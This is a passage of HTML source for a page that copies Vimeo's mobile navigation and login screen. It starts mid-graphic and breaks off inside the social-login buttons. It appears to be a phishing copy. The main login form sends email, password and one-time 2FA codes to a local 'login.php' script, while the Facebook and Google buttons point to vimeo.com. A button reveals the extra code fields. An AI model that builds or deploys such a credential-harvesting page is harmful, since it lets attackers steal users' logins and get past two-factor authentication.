144,0.316-0.293,0.479-0.438c0.34,0.586,0.688,1.168,1.068,1.732c5.165,7.967,13.734,11.954,25.695,11.954c16.09,0,31.966-4.492,47.616-13.488c1.756-0.99,3.422-1.979,5.017-2.97c0.986,1.991,2.138,3.866,3.502,5.591c6.052,7.521,14.912,11.281,26.575,11.281c14.025,0,25.767-4.938,35.216-14.815c9.449-9.876,14.466-21.598,15.061-35.163C441.387,64.684,439.102,56.503,434.079,50.16z M305.118,90.003c-0.084-1.909-0.084-2.867,0-2.867c0.143-5.579,2.505-11.417,7.074-17.514s9.062-9.146,13.488-9.146c3.392,0,5.01,1.987,4.867,5.948c-0.149,2.938-2.362,6.764-6.634,11.462C318.606,83.324,312.341,87.362,305.118,90.003z M415.918,73.868c-0.297,7.1-2.434,13.902-6.42,20.413c-4.725,7.845-10.414,11.76-17.055,11.76c-2.958,0-5.249-1.624-6.867-4.88c-1.476-2.809-2.142-6.064-1.993-9.767c0.291-7.54,2.505-14.64,6.647-21.3c4.866-8.136,11.067-12.207,18.601-12.207c2.356,0,4.168,1.67,5.424,4.997S416.067,69.875,415.918,73.868z"></path>
                                </g>
                            </svg>
                        </a>

                                                <button data-action="menu.settings.open" data-gtm-click="mobile_nav_settings_click" data-fatal-attraction="container:top_nav|component:settings" class="menu_settings pull_right js-topnav_mobile_header_settings">
                            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="18.86px" height="20px" viewBox="0 0 18.86 20" style="enable-background:new 0 0 18.86 20;" xml:space="preserve">
                                <g id="gear_1_">
                                    <g>
                                        <g id="Icon_1_" transform="translate(5.000000, 5.000000)">
                                            <g id="Group-10_1_">
                                            </g>
                                        </g>
                                        <path id="Combined-Shape_1_" style="fill:none;stroke:#b1b1b1;stroke-width:2;" d="M12,4.58l-0.57-0.27V1.99c0-0.54-0.45-0.99-1-0.99h-2c-0.55,0-1,0.45-1,0.99v2.31
                                            L6.86,4.58c-0.29,0.14-0.57,0.3-0.84,0.48L5.5,5.42L3.49,4.26C3.02,3.99,2.41,4.16,2.14,4.63l-1,1.74
                                            C0.86,6.84,1.02,7.46,1.49,7.73L3.5,8.89L3.45,9.52C3.44,9.68,3.43,9.84,3.43,10s0.01,0.32,0.02,0.48l0.05,0.63l-2.01,1.16
                                            c-0.47,0.27-0.63,0.88-0.36,1.36l1,1.74c0.27,0.48,0.89,0.64,1.36,0.37l2.01-1.16l0.52,0.36c0.27,0.18,0.55,0.35,0.84,0.48
                                            l0.57,0.27v2.31c0,0.54,0.45,0.99,1,0.99h2c0.55,0,1-0.45,1-0.99v-2.31L12,15.42c0.29-0.14,0.57-0.3,0.84-0.48l0.52-0.36
                                            l2.01,1.16c0.47,0.27,1.08,0.11,1.36-0.37l1-1.74c0.27-0.48,0.11-1.09-0.36-1.36l-2.01-1.16l0.05-0.63
                                            c0.01-0.16,0.02-0.32,0.02-0.48s-0.01-0.32-0.02-0.48l-0.05-0.63l2.01-1.16c0.47-0.27,0.63-0.88,0.36-1.36l-1-1.74
                                            c-0.27-0.48-0.89-0.64-1.36-0.37l-2.01,1.16l-0.52-0.36C12.57,4.88,12.29,4.72,12,4.58z"></path>
                                        <circle id="Oval_1_" style="fill:none;stroke:#b1b1b1;stroke-width:2;" cx="9.43" cy="10" r="2"></circle>
                                    </g>
                                </g>
                            </svg>
                        </button>
                                    </div>

                <ul id="menu_list" class="menu_list_logged_out not-visible">
                                                                        <li>
                                <a class="main_item" data-breeze-ignore="" data-fatal-attraction="container:top_nav|component:join|target:/join" data-gtm-click="top_nav_join_click" id="js-join-link" href="https://vimeo.com/join">
                                    Join                                </a>
                            </li>
                                                    <li>
                                <a class="main_item" data-breeze-ignore="" data-fatal-attraction="container:top_nav|component:login|target:/log_in" data-gtm-click="top_nav_login_click" id="js-login-link" href="https://vimeo.com/log_in">
                                    Login                                </a>
                            </li>
                                                                                                                <li>
                                                    <div class="dropdown_list">
    <button class="dropdown_toggle_button js-topnav_mobile_menu_toggle">
        <span class="main_item">Why Vimeo?</span>
        <span class="dropdown_arrow js-top_nav_toggle_arrow">
            <svg width="12" height="8">
                <path d="M11.45.914L5.914 6.45 4.473 5.008l-2.03-2.03L.378.914" stroke="#1A2E3A" stroke-width="1.2" fill="none"></path>
            </svg>
        </span>
    </button>
    <div aria-hidden="true" class="toggle_list js-top_nav_toggle_list">
                                    <div class="submenu_header">Overview</div>
                        <ul>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:solutions|keyword:marketing" href="https://vimeo.com/solutions/marketing">
                            Market your business                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:solutions|keyword:communications" href="https://vimeo.com/solutions/communications">
                            Communicate internally                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:why_vimeo|keyword:collaborate_on_video" href="https://vimeo.com/features/video-collaboration">
                            Collaborate on video                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:why_vimeo|keyword:monetize_your_video" href="https://vimeo.com/ott?mkc=entprsb">
                            Monetize your videos                        </a>
                    </li>
                            </ul>
                                    <div class="submenu_header">User type</div>
                        <ul>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:product|keyword:enterprise" href="https://vimeo.com/enterprise">
                            Enterprise                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:solutions|keyword:small_business" href="https://vimeo.com/solutions/small-business-solutions">
                            Small business                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:solutions|keyword:creative_professionals" href="https://vimeo.com/solutions/creative-professionals-solutions">
                            Creative professionals                        </a>
                    </li>
                            </ul>
                                    <div class="submenu_header">Industry</div>
                        <ul>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:solutions|keyword:fitness" href="https://vimeo.com/solutions/fitness-solutions">
                            Fitness                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:solutions|keyword:faith" href="https://vimeo.com/solutions/faith-solutions">
                            Faith                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:solutions|keyword:education" href="https://vimeo.com/solutions/education-solutions">
                            Education                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:why_vimeo|keyword:ecommerce" href="https://vimeo.com/create/ecommerce">
                            Ecommerce                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:why_vimeo|keyword:real_estate" href="https://vimeo.com/create/real-estate">
                            Real estate                        </a>
                    </li>
                            </ul>
            </div>
</div>
                                                </li>
                                                                    <li>
                                                    <div class="dropdown_list">
    <button class="dropdown_toggle_button js-topnav_mobile_menu_toggle">
        <span class="main_item">Features</span>
        <span class="dropdown_arrow js-top_nav_toggle_arrow">
            <svg width="12" height="8">
                <path d="M11.45.914L5.914 6.45 4.473 5.008l-2.03-2.03L.378.914" stroke="#1A2E3A" stroke-width="1.2" fill="none"></path>
            </svg>
        </span>
    </button>
    <div aria-hidden="true" class="toggle_list js-top_nav_toggle_list">
                                    <div class="submenu_header">Create</div>
                        <ul>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:product|keyword:interactive_video" href="https://vimeo.com/features/interactive-video">
                            Interactive video                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:product|keyword:live_streaming" href="https://vimeo.com/features/livestreaming?mkc=368ip_fc_live">
                            Live stream                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:product|keyword:screen_recorder" href="https://vimeo.com/features/screen-recorder">
                            Screen record                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:product|keyword:create" href="https://vimeo.com/create">
                            Create from templates                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:product|keyword:for_hire" href="https://vimeo.com/for-hire">
                            Hire a video pro                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:product|keyword:stock" href="https://vimeo.com/stock">
                            License stock footage                        </a>
                    </li>
                            </ul>
                                    <div class="submenu_header">Manage</div>
                        <ul>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:product|keyword:video_library" href="https://vimeo.com/features/video-library?mkc=368ip_fm_vl">
                            Video library                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:product|keyword:video_player" href="https://vimeo.com/features/video-player?mkc=368ip_fm_adfree">
                            Ad-free player                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:product|keyword:hosting" href="https://vimeo.com/features/online-video-hosting?mkc=368ip_fm_hosting">
                            Hosting                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:product|keyword:privacy" href="https://vimeo.com/features/video-privacy?mkc=368ip_fm_privacy">
                            Privacy                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:product|keyword:collaboration" href="https://vimeo.com/features/video-collaboration?mkc=368ip_fm_collab">
                            Collaboration                        </a>
                    </li>
                            </ul>
                                    <div class="submenu_header">Grow</div>
                        <ul>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:product|keyword:enterprise" href="https://vimeo.com/enterprise?mkc=368-menu-grow">
                            Enterprise                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:product|keyword:live_events" href="https://vimeo.com/features/virtual-events">
                            Host virtual events                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:product|keyword:distribution" href="https://vimeo.com/features/video-marketing?mkc=368ip_fg_publish">
                            Publish everywhere                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:product|keyword:analytics" href="https://vimeo.com/features/video-analytics?mkc=368ip_fg_analyze">
                            Analyze                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:product|keyword:monetization" href="https://vimeo.com/ott?mkc=entprsb">
                            Monetize                        </a>
                    </li>
                            </ul>
            </div>
</div>
                                                </li>
                                                                    <li>
                                                    <div class="dropdown_list">
    <button class="dropdown_toggle_button js-topnav_mobile_menu_toggle">
        <span class="main_item">Resources</span>
        <span class="dropdown_arrow js-top_nav_toggle_arrow">
            <svg width="12" height="8">
                <path d="M11.45.914L5.914 6.45 4.473 5.008l-2.03-2.03L.378.914" stroke="#1A2E3A" stroke-width="1.2" fill="none"></path>
            </svg>
        </span>
    </button>
    <div aria-hidden="true" class="toggle_list js-top_nav_toggle_list">
                                    <div class="submenu_header">Learn</div>
                        <ul>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:inspiration|keyword:blog" data-gtm-click="top_nav_inspiration_blog" href="https://vimeo.com/blog">
                            Vimeo blog                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:inspiration|keyword:video_school" data-gtm-click="top_nav_inspiration_video_school" href="https://vimeo.com/blog/category/video-school">
                            Video School                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:resources_learn|keyword:customer_stories" href="https://vimeo.com/blog/category/case-study">
                            Customer stories                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:resources_learn|keyword:investor_relations" href="https://investors.vimeo.com">
                            Investor Relations                        </a>
                    </li>
                            </ul>
                                    <div class="submenu_header">Connect</div>
                        <ul>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:resources_connect|keyword:developer_tools" href="https://developer.vimeo.com/">
                            Developer tools                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:resources_connect|keyword:partner_program" href="https://vimeo.com/partners">
                            Partner program                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:resources_connect|keyword:creative_community" href="https://vimeo.com/experts">
                            Creative community                        </a>
                    </li>
                                    <li>
                        <a data-fatal-attraction="container:top_nav|component:resources_connect|keyword:help_center" href="https://vimeo.zendesk.com/hc/en-us">
                            Help center                        </a>
                    </li>
                            </ul>
            </div>
</div>
                                                </li>
                                                                    <li>
                                                    <a class="main_item" data-fatal-attraction="container:top_nav|component:watch" data-gtm-click="top_nav_watch_click" href="https://vimeo.com/watch">
                                                                Watch                            </a>
                                                </li>
                                                                    <li>
                                                    <a class="main_item" data-gtm-click="top_nav_pricing_click" data-fatal-attraction="container:top_nav|component:pricing" href="https://vimeo.com/upgrade">
                                                                Pricing                            </a>
                                                </li>
                                                                    <li>
                                                    <a class="main_item" data-gtm-click="top_nav_contact_sales_click" data-fatal-attraction="container:top_nav|component:contact_sales|keyword:contact_sales" href="https://vimeo.com/enterprise/contact-us?mkc=368tnc">
                                                                Contact Sales                            </a>
                                                </li>
                                                                <li>
                            <a class="main_item" href="https://vimeo.com//vimeo.com/search">
                                <svg class="search_icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">
                                    <title>Search</title>
                                    <path d="M26.74,25.32l-4.53-4.53a1,1,0,0,0-.21-.14A9,9,0,1,0,20.65,22a1,1,0,0,0,.14.21l4.53,4.53a1,1,0,0,0,1.41-1.41ZM15,22a7,7,0,1,1,7-7A7,7,0,0,1,15,22Z"></path>
                                </svg>
                                Search                            </a>
                        </li>
                                    </ul>
            </div>
            <div class="bottom_buttons_container">
                                    <div>
                        <a href="https://vimeo.com/upload" class="dark_button" data-breeze-ignore="" data-fatal-attraction="container:top_nav|keyword:upload" data-gtm-click="top_nav_upload_click" id="js-upload-link">
                            <span>
                                <svg width="23" height="17" viewBox="0 0 30 22">
                                    <path d="M9.583 4.923A8.2 8.2 0 0124.778 9.39 5.7 5.7 0 0122.7 20.4l-16-.001A5.7 5.7 0 116.7 9h1.682a8.162 8.162 0 011.2-4.077zm-3.636 5.34A4.501 4.501 0 006.7 19.2h16a4.5 4.5 0 00.799-8.93A7 7 0 109.65 10.2H6.7a4.53 4.53 0 00-.753.063zm9.633.859V19.2h-1v-8.093l-3.043 3.043-.707-.707L15.073 9.2l4.242 4.243-.707.707-3.028-3.028z" fill="#FFF" fill-rule="evenodd"></path>
                                </svg>
                            </span>
                            <span>Upload</span>
                        </a>
                    </div>
                            </div>
        </div>
    </div>

        <section class="topnav_mobile_menu topnav_mobile_menu_settings lohp_mobile_menu_settings js-topnav_mobile_menu_settings">
        <div class="topnav_mobile_bar submenu">
            <button class="topnav_mobile_button topnav_mobile_pull_left js-topnav_mobile_header_settins_close topnav_icon_mobile_arrowleft_b"> </button>
            <h1 class="topnav_mobile_header_title submenu">More stuff</h1>
        </div>

        <ul class="menu_list_settings_logged_out">
                            <li>
                                            <a data-action="menu.close" class=" " href="https://vimeo.com/terms">
                            Terms of Service                        </a>
                                                        </li>
                            <li>
                                            <a data-action="menu.close" class=" " href="https://vimeo.com/privacy">
                            Privacy Policy                        </a>
                                                        </li>
                            <li>
                                            <a data-action="menu.close" class=" " href="https://vimeo.com/dmca">
                            Copyright                        </a>
                                                        </li>
                            <li>
                                            <a data-action="menu.close" class=" " href="https://vimeo.com/cookie_policy">
                            Cookies                        </a>
                                                        </li>
                            <li>
                                            <a data-action="desktop" onclick="vimeo.mobile.desktop_shared._s2ds(); return false" href="javascript:void(0)">
                            Desktop site                        </a>
                                                        </li>
                            <li>
                                            <a language="" href="#">
                            Language                        </a>
                                                                <select onchange="vimeo.mobile.desktop_shared._s2l(this)" title="Choose a different language" class="topnav_mobile_menu_settings_language">
                                                                                        <option class="selected" selected="" value="en" name="select_language">
                                    English                                </option>
                                                            <option value="es" name="select_language">
                                    Español                                </option>
                                                            <option value="de-DE" name="select_language">
                                    Deutsch                                </option>
                                                            <option value="fr-FR" name="select_language">
                                    Français                                </option>
                                                            <option value="ja-JP" name="select_language">
                                    日本語                                </option>
                                                            <option value="pt-BR" name="select_language">
                                    Português                                </option>
                                                            <option value="ko-KR" name="select_language">
                                    한국어                                </option>
                                                    </select>
                                    </li>
                            <li>
                                            <a data-action="menu.close" class=" " href="https://vimeo.zendesk.com/hc/en-us">
                            FAQ                        </a>
                                                        </li>
                            <li>
                                            <a data-action="menu.close" class=" " href="https://vimeo.zendesk.com/hc/">
                            Help                        </a>
                                                        </li>
                    </ul>


        <div class="topnav_mobile_menu_copyright">TM + © 2022 Vimeo.com, Inc.</div>
    </section>


        </nav>

<script>
(function(window, document){

    // Global values
    window.vimeo = window.vimeo || {};
    vimeo.mobile = vimeo.mobile || {};
    Vimeo = vimeo.mobile || {};
    Vimeo.desktop_shared = Vimeo.desktop_shared || {};

    // DESKTOP HANDLERS

    var desktop = document.getElementById('topnav_desktop');

    // Prevent touch device to higtlight the area tapped
    desktop.addEventListener('touchstart', function(e){
        // Take into consideration avatar img
        var target = (e.target.tagName.toLowerCase() === 'img') ? e.target.parentNode : e.target;

        if (target.classList.contains('topnav_has_dropdown')) {
            e.preventDefault();
            e.stopPropagation();
        }
    }, false);

    // Add last_page cookie
    var listen = 'ontouchstart' in window ? 'touchstart' : window.PointerEvent ? 'pointerdown' : window.MSPointerEvent ? 'MSPointerDown' : 'click';
    desktop.addEventListener(listen, function(e){
        if (e.target.classList.contains('js-topnav_menu_auth')) {
            document.cookie = 'last_page=' + encodeURIComponent(window.location.pathname) + ';path=\'/\';max-age=1800;';
        }
    }, false);

    // MOBILE HANDLERS

    // Trigger iOS Upload flow
    Vimeo.desktop_shared._upload = function(e) {
        // show iTunes only if we are in iOS world
        if (/iPad|iPhone|iPod/.test(navigator.userAgent)){
            var deeplink = 'vimeo://app.vimeo.com/upload?ref=mobileweb',
                fallback = '/upload',
                webkitHiddenCallback,
                hitCallback;

            // Callbacks
            webkitHiddenCallback = function() {
                // If the user is still here open the url page.
                if (!document.webkitHidden) {
                    window.location = fallback;
                }
            };

            // Try to open the Vimeo App
            hitCallback = function() {
                window.location = deeplink;
                setTimeout(webkitHiddenCallback, 25);
            };

            hitCallback();

            return false;
        }

        window.location = e.href;

    }


// AFTER MOBILE NAV TEST RECONCILE WITH THE `mobile_menu_script.phtml`
// ===================================================================
    // Switch to desktop site
    Vimeo.desktop_shared._s2ds = function() {
        document.cookie='opt_out_mobile=1;expires=Fri, 31 Dec 9999 23:59:59 GMT;domain=' + vimeo.domain;
        window.location.reload();
    };

    // Switch to language
    Vimeo.desktop_shared._s2l = function(sel) {
        var lang = sel.value,
            xhr = new XMLHttpRequest();

        xhr.open('POST', '/settings/locale');
        xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
        xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        xhr.send('locale=' + lang + '&token=' + vimeo.xsrft);
        xhr.onload = function post() {
            if (xhr.status === 200) {
                window.location.reload();
            }
        };
    };

    var mobileMenuEle = document.querySelector('.js-topnav_mobile_header_logo');
    if (mobileMenuEle) {
        mobileMenuEle.addEventListener('click', function(e) {

            e.stopPropagation();
            e.preventDefault();
            // Open Menu
            var mobile_menu_main = document.querySelector('.js-topnav_mobile_menu_main');
            mobile_menu_main.style.display = 'block';

            // Close Menu
            var mobile_header_close = document.querySelector('.js-topnav_mobile_header_close');
            mobile_header_close.addEventListener('click', function(e) {
                e.stopPropagation();
                e.preventDefault();
                var toggle_list = mobile_menu_main.querySelectorAll('.js-top_nav_toggle_list');
                if(toggle_list.length) {
                    toggle_list.forEach(function(el){
                        if(el.classList.contains('expand')) {
                            el.setAttribute('aria-hidden', true);
                            el.classList.remove('expand');
                        }
                    })
                }

                var arrow_list = mobile_menu_main.querySelectorAll('.js-top_nav_toggle_arrow');
                if(arrow_list.length) {
                    arrow_list.forEach(function(el){
                        if(el.classList.contains('rotate')) {
                            el.classList.remove('rotate');
                        }
                    })
                }
                mobile_menu_main.style.display = 'none';
            });

            // Toggle Settings
            var mobile_menu_settings = document.querySelector('.js-topnav_mobile_menu_settings');
            var topnav2015_mobile_header_settings = document.querySelector('.js-topnav_mobile_header_settings');
            topnav2015_mobile_header_settings.addEventListener('click', function(e) {
                e.stopPropagation();
                e.preventDefault();
                mobile_menu_settings.style.display = 'block';
                mobile_menu_main.style.display = 'none';
                var topnav2015_mobile_header_settings_close = document.querySelector('.js-topnav_mobile_header_settins_close');
                topnav2015_mobile_header_settings_close.addEventListener('click', function(e) {
                    e.stopPropagation();
                    e.preventDefault();
                    mobile_menu_settings.style.display = 'none';
                    mobile_menu_main.style.display = 'block';
                });
            });

            //Dropdown
            var mobile_dropdown_toggle = document.querySelectorAll('.js-topnav_mobile_menu_toggle');
            mobile_dropdown_toggle.forEach(function(btn) {
                btn.onclick = function(e) {
                    e.stopPropagation();
                    e.preventDefault();
                    var button = e.target;
                    var arrow = button.querySelector('.js-top_nav_toggle_arrow');
                    if(arrow) {
                        if(arrow.classList.contains('rotate')) {
                            arrow.classList.remove('rotate');
                        } else {
                            arrow.classList.add('rotate');
                        }
                    }
                    var parent = button.parentElement;
                    if(parent) {
                        var toggle_list = parent.querySelector('.js-top_nav_toggle_list');
                        if(toggle_list) {
                            if(toggle_list.classList.contains('expand')) {
                                toggle_list.setAttribute('aria-hidden', true);
                                toggle_list.classList.remove('expand');
                            } else {
                                toggle_list.setAttribute('aria-hidden', false);
                                toggle_list.classList.add('expand');
                            }
                        }
                        
                    }
                };
            });
        }, false);
    };

    var mobileAlbumsEle = document.querySelector('.js-topnav_mobile_header_albums');
    if (mobileAlbumsEle) {
        mobileAlbumsEle.addEventListener('click', function(e) {
            e.stopPropagation();
            e.preventDefault();
            var mobile_menu_albums = document.querySelector('.js-topnav_mobile_album_list');
            mobile_menu_albums.classList.add('open');

            // Close
            var mobile_albums_close = document.querySelector('.js-topnav_mobile_album_list_close');
            if (mobile_albums_close) {
                mobile_albums_close.addEventListener('click', function(e) {
                    e.stopPropagation();
                    e.preventDefault();
                    mobile_menu_albums.classList.remove('open');
                });
            }
        }, false);
    };
})(window, document);

// ^^^^^^^^^^^^^^^^^^^^
// AFTER MOBILE NAV TEST RECONCILE WITH THE `mobile_menu_script.phtml`
// ===================================================================
</script>

<article class="main-content login">
    <div class="intro_card">
        <div class="inner_wrap clearfix">
            
<div id="registration_forms" class="col transparent_overlay_box registration_forms ">
    <div class="login_form">
                    
<form class="row cta_form login_page-form " action="./login.php" method="post" novalidate="">
</form>

<form class="row cta_form login_page-form " action="./login.php" method="post" novalidate="">
    <input type="hidden" name="action" value="login">
    <input type="hidden" name="service" value="vimeo">

        <input type="hidden" name="is_legacy_form" value="1">
    
    <input type="hidden" name="otp_required" value="">

    
            <div class="full_form-header">
                            <h1>Log in to Vimeo</h1>
                    </div>
    
    <div class="row input_wrapper">
        <input class="iris_form_text iris_form_text--lg" type="email" name="email" placeholder="Email address" title="Please enter a valid email address" value="" maxlength="128" required="" pattern="^(?:[a-zA-Z0-9áéíèàùñÑêÊäÄöÖüÜçÇ!#$%&amp;'*+\/=?^_`{|}~-]\.?){0,63}[a-zA-Z0-áéíèàùñÑêÊäÄöÖüÜçÇ!#$%&amp;'*+\/=?^_`{|}~-]@(?:(?:[a-zA-Z0-9áéíèàùñÑêÊäÄöÖüÜçÇ](?:[a-zA-Z0-9-áéíèàùñÑêÊäÄöÖüÜçÇ]{0,61}[a-zA-Z0-9áéíèàùñÑêÊäÄöÖüÜçÇ])?\.)*[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9áéíèàùñÑêÊäÄöÖüÜçÇ])?|\[(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\])$">
    </div>

    <div class="row input_wrapper">
        <input class="iris_form_text iris_form_text--lg" type="password" name="password"  placeholder="Password" title="Please enter your password" value="" required="">
        <div>
                            <a class="forgot_password iris_link iris_link--opaque" tabindex="-1" href="https://vimeo.com/forgot_password">Forgot your password?</a>
                    </div>
    </div>

    <div id="otp_email_div" class="row text_md center-text   l-hide">
        A security code has been sent to your email address    
    </div>

    <div id="otp_authenticator_div" class="row input_wrapper   l-hide">
        Please enter the code from the authenticator app you configured when setting up Two-Factor authentication (2FA).    
    </div>
    
    <div id="otp_div" class="row input_wrapper  l-hide">
        <input class="iris_form_text iris_form_text--lg" type="hidden" name="otp" id="login_otp" placeholder="Authentication Code" title="Please enter a valid code" value="" maxlength="6" required="" pattern="^[0-9]{6,6}$">
        <div>
            <input type="hidden" name="request_new_token" id="request_new_token" value="">
            <a class="resend_otp iris_link iris_link--opaque" href="#" >Email me a new code</a>
            <input class="iris_form_text iris_form_text--lg js-login_otp" type="number" name="otp" id="login_otp" placeholder="OTP" title="Please enter your OTP" maxlength="6" pattern="^[0-9]{6,6}$" value="" required="">
            <button type="submit" class="iris_btn iris_btn--lg iris_btn--primary" style="margin-top: 15px">Log in with email</button>
        </div>
    </div>


    <div class="row input_wrapper form-errors">
        <!-- hide form error when form is valid or otp has not been entered yet. -->
        <!--<div class="iris_notification iris_notification--warning iris_notification--no-icon l-hide">
                    </div>-->
    </div>

    <div class="row input_wrapper">
        <button type="button" class="iris_btn iris_btn--lg iris_btn--primary js-email-submit" onclick="document.querySelectorAll('.l-hide').forEach(item=>item.classList.remove('l-hide'));this.classList.add('l-hide')">Log in with email</button>
        
    </div>
<input type="hidden" name="token" value="57580c8e7bf77d71f06853e9212d01d9aa847f19.v9n0n4sbhg.1658718808"><input name="token" type="hidden" value="57580c8e7bf77d71f06853e9212d01d9aa847f19.v9n0n4sbhg.1658718808"></form>


<div id="alt_login">
            <div class="row input_wrapper js-sso-continue">
    <div class="form_note single-sign-on-enabled">
        <svg viewBox="0 0 20 20" class="iris-lock" width="12px" height="12px">
            <path d="M15 8V5A5 5 0 0 0 5 5v3a3 3 0 0 0-3 3v6a3 3 0 0 0 3 3h10a3 3 0 0 0 3-3v-6a3 3 0 0 0-3-3zM7 5a3 3 0 0 1 6 0v3H7zm9 12a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1v-6a1 1 0 0 1 1-1h10a1 1 0 0 1 1 1z" fill="#1a2e3b"></path>
        </svg>
        <span>Single sign-on enabled</span>
    </div>

    <div class="sso-tracking-consent">
        <div class="InputCheckboxWrapper">
            <label class="InputLabelInline">
                <span>
                    <input type="checkbox" class="InputCheckbox js-sso-tracking-consent-checkbox">
                    <span class="InputCheckboxOverlay"></span>
                </span>
            </label>
            <span class="InputCheckboxLabel">By signing in with single-sign-on (SSO), I agree and understand that the organization that controls my email domain will administer my account and have access to my account information, including viewing activity.</span>
        </div>
    </div>

    <div class="sso-enterprise-upsell">
        <span class="sso-enterprise-upsell-icon-container">
            <svg viewBox="0 0 24 24" class="tooltip-annotation-icon-sso-enterprise-upsell">
                <path d="M12 22a10 10 0 1110-10 10 10 0 01-10 10zm0-18a8 8 0 108 8 8 8 0 00-8-8z" fill="#1a2e3b"></path><path fill="#1a2e3b" d="M11 11h2v6h-2zm1-2a1 1 0 01-1-1 1.46 1.46 0 010-.2.63.63 0 01.06-.18.77.77 0 01.09-.18 1.48 1.48 0 01.12-.15.92.92 0 01.33-.21 1 1 0 011.09.21A1.05 1.05 0 0113 8a.84.84 0 01-.08.38 1 1 0 01-.21.33l-.15.12-.18.09-.18.08z"></path>
            </svg>
        </span>
        <span class="sso-enterprise-upsell-text-container">
            SSO is not enabled for this domain. Interested in additional security for your team? <a href="https://vimeo.com/enterprise/contact-us?mkc=ent_sso_privacy">Contact us.</a>        </span>
    </div>

    <a class="js-sso-connect-btn" href="#">
        <button class="iris_btn iris_btn--lg iris_btn--full iris_btn--positive" id="sso-connect-btn" disabled="">Continue</button>
        <button class="iris_btn iris_btn--lg iris_btn--full iris_btn--positive" id="sso-checking-btn" disabled="">Checking...</button>
    </a>

    <div class="restart_link sso">
        <a class="iris_link js-sso-use-different-email" href="#">
            Use a different email address        </a>
    </div>
</div>
    
    <div class="row form-or">
        or    </div>

    <form class="row" id="facebook_form" action="https://vimeo.com/log_in" method="POST" novalidate="" data-ds-protection="enabled" data-xsrf-protection="enabled">

        <input type="hidden" name="service" value="facebook">
        <input type="hidden" name="action" value="login">
        
        
        <div class="row login_facebook">
            <button type="submit" class="iris_btn iris_btn--lg facebook">
                <span class="iris_btn__content-wrapper">
                    <span class="login-btn__content-wrapper">
                        <div class="login-btn__icon-container">
                            <img src="./facebook.svg" class="facebook-icon">
                        </div>
                        <div class="login-btn__message">
                            Log in with Facebook                        </div>
                    </span>
                </span>
            </button>
        </div>
            <input type="hidden" name="token" value="57580c8e7bf77d71f06853e9212d01d9aa847f19.v9n0n4sbhg.1658718808"><input name="token" type="hidden" value="57580c8e7bf77d71f06853e9212d01d9aa847f19.v9n0n4sbhg.1658718808"></form>

    <form class="row" id="google_form" action="https://vimeo.com/log_in" method="POST" novalidate="" data-ds-protection="enabled" data-xsrf-protection="enabled">

        <input type="hidden" name="service" value="google">
        <input type="hidden" name="action" value="login">
        
        
        <div class="row login_google">
            <button type="submit" class="iris_btn iris_btn--lg google">
                <span class="iris_btn__content-wrapper">
                    <span class="login-btn__content-wrapper">
                        <div class="login-btn__icon-container">
                            <img src="./google.svg" class="google-icon">
                        </div>
                        <div class="login-btn__message">
                            Log in with Google                        </div>
                    </span>
                </span>
            </button>
        </div>
            <input type="hidden" name="token" value="57580c8e7bf77d71f06853e9212d01d9aa847f19.v9n0n4sbhg.1658718808"><input name="token" type="hidden" value="57580c8e7bf77d71f06853e9212d01d9aa847f19.v9n0n4sbhg.1658718808"></form>

    <form class="row" id="apple_form" action="https://vimeo.com/log_in" novalidate="" method="POST" data-ds-protection="enabled" data-xsrf-protection="enabled">

        <input type="hidden" name="service" value="apple">
        <input type="hidden" name="action" value="login">

        <div class="row login_apple">
            <button type="submit" class="iris_btn iris_btn--lg apple">
                <span class="iris_btn__content-wrapper">
                    <span class="login-btn__content-wrapper">
